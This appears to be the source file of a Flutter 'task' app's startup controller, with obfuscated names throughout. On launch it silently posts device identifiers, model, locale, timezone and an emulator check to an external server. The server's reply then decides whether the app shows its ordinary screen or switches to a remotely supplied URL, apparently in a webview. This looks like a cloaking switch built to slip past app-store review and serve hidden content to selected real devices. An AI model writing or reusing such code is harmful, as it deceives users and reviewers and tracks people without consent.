import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class TaskGressLogic extends GetxController {

  var atiyrxbs = RxBool(false);
  var symjehigu = RxBool(true);
  var zkpvl = RxString("");
  var sam = RxBool(false);
  var schoen = RxBool(true);
  final mtwkhqj = Dio();


  InAppWebViewController? webViewController;

  dynamic msqrfuac(){
    final wifqgb = InternetConnectionChecker.instance;
    final ngkrhifld = wifqgb.onStatusChange.skip(1).listen(
          (InternetConnectionStatus bgkrwdazi) {
        if (bgkrwdazi == InternetConnectionStatus.connected) {
          ouwfqsn();
        } else {
          Get.toNamed('/task_netup')?.then((_){
            ouwfqsn();
          });
        }
      },
    );
    return ngkrhifld;
  }

  Future<bool> wspgbly() async {
    var sdilum = await InternetConnectionChecker.instance.hasConnection;
    if(!sdilum){
      Get.toNamed('/task_netup')?.then((_){
        ouwfqsn();
      });
    }
    return sdilum;
  }

  @override
  void onInit() {
    super.onInit();
    msqrfuac();
    ouwfqsn();
  }


  Future<void> ouwfqsn() async {

    var ykbglicnqx = await wspgbly();
    if(!ykbglicnqx){
      return;
    }

    sam.value = true;
    schoen.value = true;
    symjehigu.value = false;

    mtwkhqj.post("https://dow.ptvzeus.com/tnVc0RM6SJud",data: await bienjhrf()).then((value) {
      var glqwn = value.data["glqwn"] as String;
      var zekgnuvr = value.data["zekgnuvr"] as bool;
      if (zekgnuvr) {
        zkpvl.value = glqwn;
        domingo();
      } else {
        terry();
      }
    }).catchError((e) {
      symjehigu.value = true;
      schoen.value = true;
      sam.value = false;
    });
  }

  Future<Map<String, dynamic>> bienjhrf() async {
    final DeviceInfoPlugin swuoib = DeviceInfoPlugin();
    PackageInfo etpz_ygfhu = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var azecn = Platform.localeName;
    var blpZNoc = currentTimeZone;

    var aOnmuGTf = etpz_ygfhu.packageName;
    var FvZX = etpz_ygfhu.version;
    var ycFfIHE = etpz_ygfhu.buildNumber;

    var BwVmIp = etpz_ygfhu.appName;
    var RlBgEaJ = "";
    var hxOt  = "";
    var WEZv = "";
    var wilmerSenger = "";
    var louveniaKulas = "";
    var sterlingAufderhar = "";
    var kaileeBins = "";


    var oRSMtln = "";
    var FCdOmN = false;

    if (GetPlatform.isAndroid) {
      oRSMtln = "android";
      var cprdlga = await swuoib.androidInfo;

      WEZv = cprdlga.brand;

      RlBgEaJ  = cprdlga.model;
      hxOt = cprdlga.id;

      FCdOmN = cprdlga.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      oRSMtln = "ios";
      var lwpfjyzr = await swuoib.iosInfo;
      WEZv = lwpfjyzr.name;
      RlBgEaJ = lwpfjyzr.model;

      hxOt = lwpfjyzr.identifierForVendor ?? "";
      FCdOmN  = lwpfjyzr.isPhysicalDevice;
    }
    var res = {
      "BwVmIp": BwVmIp,
      "louveniaKulas" : louveniaKulas,
      "ycFfIHE": ycFfIHE,
      "FvZX": FvZX,
      "RlBgEaJ": RlBgEaJ,
      "blpZNoc": blpZNoc,
      "sterlingAufderhar" : sterlingAufderhar,
      "WEZv": WEZv,
      "hxOt": hxOt,
      "azecn": azecn,
      "oRSMtln": oRSMtln,
      "FCdOmN": FCdOmN,
      "wilmerSenger" : wilmerSenger,
      "aOnmuGTf": aOnmuGTf,
      "kaileeBins" : kaileeBins,

    };
    return res;
  }

  Future<void> terry() async {
    Get.offNamed("/task_main");
  }

  Future<void> domingo() async {
    Get.offNamed("/task_tools");
  }

  @override
  void dispose() {
    msqrfuac().cancel();
    super.dispose();
  }

}
